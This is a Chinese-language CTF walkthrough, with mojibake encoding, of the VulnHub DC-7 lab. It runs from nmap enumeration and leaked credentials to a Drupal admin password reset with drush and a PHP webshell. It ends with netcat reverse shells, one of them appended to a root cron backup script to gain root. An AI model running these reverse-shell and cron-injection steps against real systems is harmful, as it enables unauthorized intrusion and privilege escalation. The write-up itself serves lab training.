# DC-7

> https://www.vulnhub.com/entry/dc-7,356/
> 

## ç«¯å£æ‰«æä¸»æœºå‘ç°

1. æ¢æµ‹å­˜æ´»ä¸»æœºï¼Œ`178`æ˜¯é¶æœº
    
    ```php
    nmap -sP 192.168.75.0/24                 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:30 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00037s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00030s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.178
    Host is up (0.00049s latency).
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00037s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. æ¢æµ‹ä¸»æœºæ‰€æœ‰å¼€æ”¾ç«¯å£
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.178
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:31 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00040s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    ```
    
3. æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬
    
    ```php
    nmap -sV -sT -O -p80,22 192.168.75.178     
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:32 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00049s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. æ‰«ææ¼æ´
    
    ```c
    nmap -script=vuln -p 80,22 192.168.75.178
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:33 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00073s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.178
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.178:80/
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: user-login-form
    |     Form action: /user/login
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: user-login-form
    |     Form action: /user/login
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/password
    |     Form id: user-pass
    |     Form action: /user/password
    |     
    |     Path: http://192.168.75.178:80/user/password
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node/help
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node/
    |     Form id: search-form
    |     Form action: /search/node/
    |     
    |     Path: http://192.168.75.178:80/search/node/
    |     Form id: search-block-form
    |_    Form action: /search/node
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /rss.xml: RSS or Atom feed
    |   /robots.txt: Robots file
    |   /INSTALL.txt: Drupal file
    |   /: Drupal version 8 
    |_  /README.txt: Interesting, a readme.
    ```
    

## webæ¸—é€

1. è®¿é—®é¡µé¢ï¼Œå‘ç°æ˜¯ `Drupal`CMS
    
    ![image.png](image%2037.png)
    
    ```python
    
    Welcome to DC-7
    DC-7 introduces some "new" concepts, but I'll leave you to figure out what they are.  :-)
    While this challenge isn't all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won't succeed.
    What you will have to do, is to think "outside" the box.
    Way "outside" the box.  :-)
    @DC7USER
    ```
    
2. çˆ†ç ´ç›®å½•çœ‹çœ‹ï¼Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆå®è´¨æ€§çš„ä¸œè¥¿
    
    ```python
    dirsearch -u 192.168.75.178 -x 403,404
    //
    [13:53:16] Starting:                                                                                                                                                                                             
    [13:55:54] 301 -  315B  - /core  ->  http://192.168.75.178/core/            
    [13:56:39] 301 -  340B  - /forum/install/install.php  ->  http://192.168.75.178/forum/install/core/install.php
    [13:57:02] 200 -    3KB - /index.php                                        
    [13:57:06] 301 -  326B  - /install.php  ->  http://192.168.75.178/core/install.php
    [13:57:06] 301 -  342B  - /install.php?profile=default  ->  http://192.168.75.178/core/install.php?profile=default
    [13:57:07] 200 -  104B  - /INSTALL.txt                                      
    [13:57:23] 200 -    7KB - /LICENSE.txt                                      
    [13:57:52] 301 -  318B  - /modules  ->  http://192.168.75.178/modules/      
    [13:58:03] 200 -    3KB - /node                                             
    [13:58:04] 406 -   68B  - /node/1?_format=hal_json                          
    [13:58:40] 301 -  319B  - /profiles  ->  http://192.168.75.178/profiles/    
    [13:58:48] 200 -    2KB - /README.txt                                       
    [13:58:55] 200 -  584B  - /robots.txt                                       
    [13:59:00] 302 -  376B  - /search  ->  http://192.168.75.178/search/node    
    [13:59:00] 302 -  376B  - /Search  ->  http://192.168.75.178/search/node    
    [13:59:15] 301 -  316B  - /sites  ->  http://192.168.75.178/sites/          
    [13:59:16] 200 -  309B  - /sites/README.txt                                 
    [13:59:44] 301 -  317B  - /themes  ->  http://192.168.75.178/themes/        
    [13:59:57] 302 -  372B  - /user/  ->  http://192.168.75.178/user/login      
    [13:59:57] 302 -  372B  - /user  ->  http://192.168.75.178/user/login
    [13:59:59] 200 -    3KB - /user/login/                                      
    [14:00:19] 200 -    4KB - /web.config                                       
    [14:00:26] 301 -  335B  - /wp-admin/install.php  ->  http://192.168.75.178/wp-admin/core/install.php
    ```
    
3. æŠŠç›®å½•ç¿»äº†åŠå¤©æ²¡æ‰¾åˆ°å¯åˆ©ç”¨çš„ï¼Œåœ¨`github`æ‰¾äº†é’ˆå¯¹äº`drupal`çš„å·¥å…·å°è¯•
    
    [https://github.com/immunIT/drupwn](https://github.com/immunIT/drupwn)
    
    ```python
            ____
           / __ \_______  ______ _      ______
          / / / / ___/ / / / __ \ | /| / / __ \
         / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
        /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                         /_/    
    [-] Version not specified, trying to identify it
    [+] Version detected: 8.0                                                                                                                                                                                        
    ============ Users ============
    [+]***** (id=1)
    [+]***** (id=2)
    ============ Default files ============
    [+] /README.txt (200)
    [+] /LICENSE.txt (200)
    [+] /robots.txt (200)
    [+] /web.config (200)
    [+] /update.php (403)
    [+] /install.php (200)
    ============ Nodes ============
    http://192.168.75.178/node/1
    http://192.168.75.178/node/3
    http://192.168.75.178/node/2
    ```
    
    ç»“æœä¹Ÿæ²¡å•¥ç”¨å°±æ˜¯äº†
    
4. å°è¯•å¼±å£ä»¤ï¼Œé”™è¯¯æ¬¡æ•°è¿‡å¤šä¼šè¢«å°ç¦
    
    ```python
    Too many failed login attempts from your IP address. This IP address is temporarily blocked. Try again later or request a new password. 
    ```
    
5. æƒ³èµ·ä½œè€…è¯´çš„è¯ï¼Œè™½ç„¶å®ƒæ˜¯`æ—©æœŸ DC ç‰ˆæœ¬`ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ å“ªä¸€ä¸ªï¼‰çš„ä¸€ç§é€»è¾‘è¿›å±•ï¼Œä½†å…¶ä¸­æ¶‰åŠä¸€äº›æ–°æ¦‚å¿µï¼Œä½†ä½ éœ€è¦è‡ªå·±å¼„æ¸…æ¥šã€‚:-) å¦‚æœä½ éœ€è¦è¯‰è¯¸æš´åŠ›ç ´è§£æˆ–å­—å…¸æ”»å‡»ï¼Œä½ å¯èƒ½ä¸ä¼šæˆåŠŸ
    
    ï¼ˆè€Œåæˆ‘ä»¬å°è¯•äº†æš´åŠ›ç ´è§£..ï¼‰
    
    æ—©æœŸDCç‰ˆæœ¬ï¼Œ`DC-1`ä¹Ÿæ˜¯`Drupal`ä½†æ˜¯ç‰ˆæœ¬éƒ½ä¸ä¸€æ ·ï¼Œæ¼æ´ä¼°è®¡ä¹Ÿè¢«ä¿®å¤äº†
    
    æ²¡æƒ³æ³•
    
6. çœ‹äº†ä¸‹dalaoä»¬çš„WPï¼Œå‘ç°è½¬æŠ˜ç‚¹åœ¨ï¼Œé¡µé¢åº•ä¸‹çš„**`@DC7USER`** ï¼Œæˆ‘ä»¬åœ¨GitHubæœç´¢èƒ½æœç´¢åˆ°
    
    [https://github.com/Dc7User/staffdb](https://github.com/Dc7User/staffdb)
    
    æ˜¯DC7çš„ä¸€äº›ä»£ç ï¼Œä¸‹é¢è¿˜è¯´
    
    ```python
    This is some "code" (yes, it's not the greatest code, but that wasn't the point) for the DC-7 challenge.
    
    This isn't a flag, btw, but if you have made it here, well done anyway. :-)
    ```
    
    ä¸æŒ‰å¥—è·¯å‡ºç‰Œå±å®æ˜¯ã€‚ã€‚ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸‹æ•°æ®åº“é…ç½®æ–‡ä»¶`config.php` ï¼Œè·å¾—æ•°æ®åº“è´¦å·å¯†ç 
    
    ```python
    <?php
    	$servername = "localhost";
    	$username = "dc7user";
    	$password = "MdR3xOgB7#dW";
    	$dbname = "Staff";
    	$conn = mysqli_connect($servername, $username, $password, $dbname);
    ?>
    ```
    
    å°è¯•åå‘ç°`ssh`å¯ä»¥ç™»é™†ä¸Šå»
    

## ææƒ

1. æŸ¥çœ‹æƒé™
    
    ```python
    dc7user@dc-7:~$ whoami
    dc7user
    dc7user@dc-7:~$ id
    uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
    dc7user@dc-7:~$ uname -a
    Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux
    ```
    
2. æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶
    - åœ¨å½“å‰`home`ç›®å½•ä¸‹å­˜åœ¨`mbox`æ–‡ä»¶ï¼Œå†…å®¹å¥½åƒè¿˜æ˜¯å®šæœŸå¤‡ä»½ä¹‹ç±»çš„
        
        ```python
        From root@dc-7 Fri Aug 30 03:15:17 2019
        Return-path: <root@dc-7>
        Envelope-to: root@dc-7
        Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
        Received: from root by dc-7 with local (Exim 4.89)
         (envelope-from <root@dc-7>)
         id 1i3O0y-0000Ed-To
         for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000
        From: root@dc-7 (Cron Daemon)
        To: root@dc-7
        Subject: Cron <root@dc-7> /opt/scripts/backups.sh
        MIME-Version: 1.0
        Content-Type: text/plain; charset=UTF-8
        Content-Transfer-Encoding: 8bit
        X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
        X-Cron-Env: <SHELL=/bin/sh>
        X-Cron-Env: <HOME=/root>
        X-Cron-Env: <LOGNAME=root>
        Message-Id: <E1i3O0y-0000Ed-To@dc-7>
        Date: Fri, 30 Aug 2019 03:15:17 +1000
        
        rm: cannot remove '/home/dc7user/backups/*': No such file or directory
        Database dump saved to /home/dc7user/backups/website.sql               [success]
        ```
        
        å¯ä»¥çŸ¥é“è„šæœ¬åœ¨`/opt/scripts/backups.sh` 
        
    - å¹¶ä¸”å½“å‰ç›®å½•ä¸‹å­˜åœ¨backupsæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ˜¯`website.sql .GPG` ï¼Œ`website.tar.gz.gpg`ï¼ˆGPGæ˜¯åŠ å¯†æ–‡ä»¶ï¼‰
3. æŸ¥çœ‹`/opt/scripts/backups.sh` æ–‡ä»¶
    
    ```python
    #!/bin/bash
    rm /home/dc7user/backups/*
    cd /var/www/html/
    drush sql-dump --result-file=/home/dc7user/backups/website.sql
    cd ..
    tar -czf /home/dc7user/backups/website.tar.gz html/
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
    chown dc7user:dc7user /home/dc7user/backups/*
    rm /home/dc7user/backups/website.sql
    rm /home/dc7user/backups/website.tar.gz
    ```
    
    ```python
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql 
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
    ```
    
    **`--pinentry-mode loopback`**ï¼šæŒ‡å®š GPG ä½¿ç”¨å‘½ä»¤è¡Œæ¨¡å¼è·å–å¯†ç ï¼Œè€Œä¸æ˜¯å¼¹å‡ºçª—å£
    
    **`--passphrase PickYourOwnPassword`**ï¼šåœ¨æ­¤å¤„ç›´æ¥æä¾›å¯†ç ï¼ˆ`PickYourOwnPassword`ï¼‰
    
    **`--symmetric`**ï¼šè¡¨ç¤ºä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹æ³•
    
    æ˜¯è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œå¹¶ä¸”ç›´æ¥ç»™å‡ºäº†å¯†ç `PickYourOwnPassword`
    
4. å°è¯•è§£å¯†ï¼Œæ–‡ä»¶å¤¹å†…ä¸¤ä¸ªæ–‡ä»¶éƒ½è§£å¯†
    
    ```python
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.tar.gz --decrypt /home/dc7user/backups/website.tar.gz.gpg
    ```
    
    åŒæ ·è®© GPG ä»å‘½ä»¤è¡Œè¯»å–å¯†ç ï¼Œä½¿ç”¨åŠ å¯†æ—¶ä½¿ç”¨çš„å¯†ç ï¼Œç ´è§£æˆåŠŸï¼Œå¹¶ä¸”æ”¶åˆ°ä¸€å°é‚®ä»¶
    
    ```python
    dc7user@dc-7:/opt/scripts$ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg
    gpg: AES256 encrypted data
    gpg: encrypted with 1 passphrase
    
    You have new mail in /var/mail/dc7user
    ```
    
5. æˆ‘ä»¬å…ˆæŸ¥çœ‹ç ´è§£å‡ºæ¥çš„æ–‡ä»¶ï¼Œå†…å®¹å¤ªå¤šåº”è¯¥æ²¡ç”¨ï¼Œè¿”å›å»çœ‹é‚®ä»¶ï¼Œåƒæ˜¯ä¹‹å‰`mbox`é‡Œçš„å†…å®¹ï¼Œç„¶åå†æŸ¥çœ‹`website.tar.gz` ï¼Œè§£å¯†åå‘ç°æ˜¯æ•´ä¸ª`HTML` çš„æ–‡ä»¶
    
    æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶`settings.php` ,å…¶å®åœ¨`/var/www`é‡Œé¢ä¹Ÿèƒ½çœ‹ï¼ˆæè¿™ä¹ˆéº»çƒ¦æ„Ÿè§‰èµ°é”™è·¯äº†ï¼‰
    
    ```python
      'username' => 'db7user',
      'password' => 'yNv3Po00',
    ```
    
6. ç™»å½•æ•°æ®åº“æˆåŠŸï¼ŒæŸ¥è¯¢æœ‰ç”¨çš„æ•°æ®
    
    ```python
    MariaDB [d7db]> select * from users;
    +-----+--------------------------------------+----------+
    | uid | uuid                                 | langcode |
    +-----+--------------------------------------+----------+
    |   0 | e813638d-3eb3-4212-af40-171dd51023e9 | en       |
    |   1 | fd93872d-a854-44cd-bb08-eb9a11e46492 | en       |
    |   2 | 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a | en       |
    +-----+--------------------------------------+----------+
    //
    MariaDB [d7db]> select * from users_field_data;
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    | uid | langcode | preferred_langcode | preferred_admin_langcode | name    | pass                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    |   0 | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      0 | 1567054076 | 1567054076 |          0 |          0 | NULL              |                1 |
    |   1 | en       | en                 | NULL                     | admin   | $S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F | admin@example.com | Australia/Melbourne |      1 | 1567054076 | 1567054076 | 1567098850 | 1567098643 | admin@example.com |                1 |
    |   2 | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      1 | 1567057938 | 1567057938 |          0 |          0 | dc7user@blah.com  |                1 |
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    ```
    
    å°è¯•å°†`users_field_data` è¡¨çš„æ•°æ®æ”¾åˆ°`john`çˆ†ç ´ï¼Œæ²¡ç ´è§£å‡ºæ¥ï¼Œå¯»æ‰¾åˆ«çš„çº¿ç´¢
    
7. ä»”ç»†è§‚å¯Ÿ`backups.sh` é‡Œé¢ä½¿ç”¨äº†`drush` å‘½ä»¤å»è¯»å–æ•°æ®åº“
    
    ```python
    # å¸®åŠ©ä¿¡æ¯
    dc7user@dc-7:/opt/scripts$ drush -h
    Drush provides an extensive help system that describes both drush commands and topics of general interest.  Use `drush help --filter` to present a list of command categories to view, and `drush topic` for a
    list of topics that go more in-depth on how to use and extend drush.
    
    Examples:
     drush                                     List all commands.                                     
     drush --filter=devel_generate             Show only commands defined in devel_generate.drush.inc 
     drush help pm-download                    Show help for one command.                             
     drush help dl                             Show help for one command using an alias.              
     drush help --format=html                  Show an HTML page detailing all available commands.    
     drush help --format=json                  All available comamnds, in a machine parseable format.
    
    Arguments:
     command                                   A command name, or command alias.
    
    Options:
     --field-labels                            Add field labels before first line of data. Default is on; use --no-field-labels to disable.                               
     --fields=<name, description>              Fields to output. All available fields are: name, description.                                                             
     --filter=[category]                       Restrict command list to those commands defined in the specified file. Omit value to choose from a list of names.          
     --format=<json>                           Select output format. Available: table, csv, html, json, list, var_export, yaml. Default is table.                         
     --sort                                    Sort commands in alphabetical order. Drush waits for full bootstrap before printing any commands when this option is used.
    
    Topics:
     docs-readme                               README.md                                    
     docs-output-formats                       Output formatting options selection and use.
    ```
    
    æŸ¥çœ‹ä¸€ä¸‹æ–‡æ¡£ ï¼šhttps://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html
    
    æ‰¾åˆ° ï¼š `user-password` ä¸ºå…·æœ‰æŒ‡å®šåç§°çš„ç”¨æˆ·è´¦æˆ·è®¾ç½®æˆ–é‡ç½®å¯†ç 
    
    å¯ä»¥ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹`admin`ç”¨æˆ·çš„å¯†ç 
    
    ```python
     drush user-password USERNAME --password="SOMEPASSWORD"
    ```
    
    ä¿®æ”¹æˆåŠŸï¼Œä¿®æ”¹å‰è®°å¾—åˆ‡æ¢ç›®å½•åˆ°`Drupal`
    
    ```python
    dc7user@dc-7:/var/www/html$ drush user-password admin --password="123456"
    Changed password for admin  
    ```
    

## åå°getshell

1. ç™»é™†åå°ï¼Œå¯»æ‰¾å¯åˆ©ç”¨çš„ç‚¹
    
    ![image.png](image%2038.png)
    
2. æœ¬æ¥æƒ³ç›´æ¥ä¿®æ”¹**`Welcome to DC-7`** çš„å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰è§£æï¼Œç™¾åº¦åçŸ¥é“`Drupal`ä¸ºäº†å®‰å…¨å°†`PHP`ç‹¬ç«‹ä¸ºäº†ä¸€ä¸ªæ¨¡å—ï¼Œä¸‹é¢æ˜¯æ¨¡å—é“¾æ¥ğŸ”—
    
    https://www.drupal.org/project/php
    
3. ç„¶ååœ¨`Extend`å®‰è£…è¯¥æ‹“å±•ï¼Œå‰ææ˜¯`Update Manager`å®‰è£…äº†
    - æ£€æŸ¥`Update Manager` æ˜¯å¦å®‰è£…äº†
        
        ![image.png](image%2039.png)
        
    - ç„¶å`Extend` å®‰è£…ä¸‹è½½çš„æ‹“å±•
        
        å®‰è£…åé€‰æ‹© å¼€å¯è¯¥æ¨¡å—
        
        ![image.png](image%2040.png)
        
        ![image.png](image%2041.png)
        
4. å®‰è£…å®Œåï¼Œæˆ‘ä»¬æ¥åˆ° `Content` é€‰é¡¹ï¼Œé€‰æ‹©**`Welcome to DC-7`** editç¼–è¾‘
    
    ![image.png](image%2042.png)
    
    å†…å®¹æ”¹ä¸ºä¸€å¥æœ¨é©¬ï¼Œç„¶åå†…å®¹æ ¼å¼åŒ–æ”¹ä¸º`php` ï¼Œç„¶åä¿å­˜
    
5. ä¿å­˜åå¤åˆ¶é¡µé¢é“¾æ¥ä½¿ç”¨èšğŸ—¡è¿æ¥ï¼Œç„¶åä½¿ç”¨èšğŸ—¡åå¼¹`shell`
    
    ```python
    (www-data:/var/www/html) $ nc 192.168.75.151 1234 -e /bin/bash
    ```
    
    è·å¾—`www-data`çš„`shell`
    
    ```python
    whoami
    www-data
    ```
    
6. æˆ‘ä»¬çŸ¥é“`backups.sh`è„šæœ¬å±ä¸»ä¸º`root`ï¼Œå±ç»„ä¸º`www-data` ï¼Œå›åˆ°`backups.sh`çš„ç›®å½•ï¼Œå°†åå¼¹`shell`è¯­å¥æ’å…¥è„šæœ¬
    
    ```python
    echo "nc 192.168.75.151 1233 -e /bin/bash" >> backups.sh
    ```
    
    æ’å…¥åç­‰å¾…ä»»åŠ¡è‡ªåŠ¨æ‰§è¡Œï¼Œå°±èƒ½è·å¾—`root`çš„æƒé™äº†
    
    ```python
    nc -lvp 1233
    listening on [any] 1233 ...
    
    id
    192.168.75.178: inverse host lookup failed: Unknown host
    connect to [192.168.75.151] from (UNKNOWN) [192.168.75.178] 54920
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
7. è¯»å–`flag`æ–‡ä»¶
    
    ```python
    # cat theflag.txt
    
    888       888          888 888      8888888b.                             888 888 888 888 
    888   o   888          888 888      888  "Y88b                            888 888 888 888 
    888  d8b  888          888 888      888    888                            888 888 888 888 
    888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
    888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
    88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
    8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
    888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
    
    Congratulations!!!
    
    Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
    who have provided feedback, and all those who have taken the time to complete these little
    challenges.
    
    I'm sending out an especially big thanks to:
    
    @4nqr34z
    @D4mianWayne
    @0xmzfr
    @theart42
    
    If you enjoyed this CTF, send me a tweet via @DCAU7.
    ```